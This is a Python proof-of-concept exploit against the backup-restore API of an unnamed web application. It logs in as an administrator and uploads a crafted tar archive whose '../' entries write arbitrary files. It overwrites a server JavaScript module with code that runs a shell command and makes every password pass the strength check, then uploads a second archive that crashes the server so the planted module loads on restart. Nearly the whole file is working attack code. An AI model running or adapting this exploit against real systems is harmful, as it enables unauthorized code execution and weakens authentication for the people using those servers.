from tempfile import mkdtemp
from io import BytesIO
import urllib3
import requests
import random
import string
import tarfile
import json
import os

HOST = "https://localhost:8443"
# Requires backups:create permission
USERNAME, PASSWORD = "admin", "Password123"


s = requests.Session()
s.verify = False
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def random_string(length=10):
    return "".join(random.choice(string.ascii_letters) for i in range(length))


def api(method, endpoint, data=None, files=None):
    r = s.request(method, HOST + endpoint, data=data, files=files)
    json = r.json()
    assert r.ok and json["status"] == "success", json
    return json["datas"]


def login(username, password):
    data = {
        "username": username,
        "password": password
    }
    return api("POST", "/api/users/token", data)


def upload_backup(file):
    files = {
        "file": (os.path.basename(file), open(file, "rb"), "application/x-tar")
    }
    return api("POST", "/api/backups/upload", files=files)


def restore_backup(slug):
    return api("POST", f"/api/backups/{slug}/restore")


def delete_backup(slug):
    return api("DELETE", f"/api/backups/{slug}")


def tar_add_str(tar: tarfile.TarFile, name: str, content: str):
    info = tarfile.TarInfo(name)
    info.size = len(content)
    tar.addfile(info, BytesIO(content.encode()))


def create_crash():
    tmp = mkdtemp()
    
    data_tar = os.path.join(tmp, "data.tar.gz")
    with tarfile.open(data_tar, "w:gz") as tar:
        dir = os.path.join(tmp, "report-templates")
        os.mkdir(dir)
        tar.add(dir, arcname=os.path.basename(dir))
        tar_add_str(tar, "report-templates/nonexistent/anything", "crash")
        tar_add_str(tar, "languages.json", json.dumps([]))
        tar_add_str(tar, "templates.json", json.dumps([]))

    payload_tar = os.path.join(tmp, "payload.tar")
    with tarfile.open(payload_tar, "w:gz") as tar:
        slug = random_string()
        tar_add_str(tar, "backup.json",
                    json.dumps({"name": None, "date": None, "slug": slug, "type": None, "protected": False, "data": ["Templates"]}))
        tar.add(data_tar, arcname=os.path.basename(data_tar))

    return payload_tar

def create_tarslip(path, content):
    tmp = mkdtemp()

    data_tar = os.path.join(tmp, "data.tar.gz")
    with tarfile.open(data_tar, "w:gz") as tar:
        dir = os.path.join(tmp, "report-templates")
        os.mkdir(dir)
        tar.add(dir, arcname=os.path.basename(dir))
        if path.startswith("/"):
            path = "../../../../../../.." + path
        tar_add_str(tar, f"report-templates/{path}", content)
        tar_add_str(tar, "languages.json", json.dumps([]))
        tar_add_str(tar, "templates.json", json.dumps([]))

    payload_tar = os.path.join(tmp, "payload.tar")
    with tarfile.open(payload_tar, "w:gz") as tar:
        slug = random_string()
        tar_add_str(tar, "backup.json",
                    json.dumps({"name": None, "date": None, "slug": slug, "type": None, "protected": False, "data": ["Templates"]}))
        tar.add(data_tar, arcname=os.path.basename(data_tar))

    return payload_tar


if __name__ == '__main__':
    print("Logged in:", login(USERNAME, PASSWORD))
    # tarslip = create_tarslip("/tmp/test", "Arbitrary File Write")
    # Crash to auto-restart after overwriting module
    tarslip = create_tarslip("/app/src/lib/passwordpolicy.js",
                             "require('child_process').execSync('id > /tmp/pwned'); exports.strongPassword = () => true;")
    print(f"Created tarslip at {tarslip}")
    backup = upload_backup(tarslip)
    print(f"Uploaded backup: {backup}")
    print(restore_backup(backup["slug"]))
    # print(delete_backup(backup["slug"]))
    print("Crashing...")
    crash = create_crash()
    backup = upload_backup(crash)
    print(restore_backup(backup["slug"]))
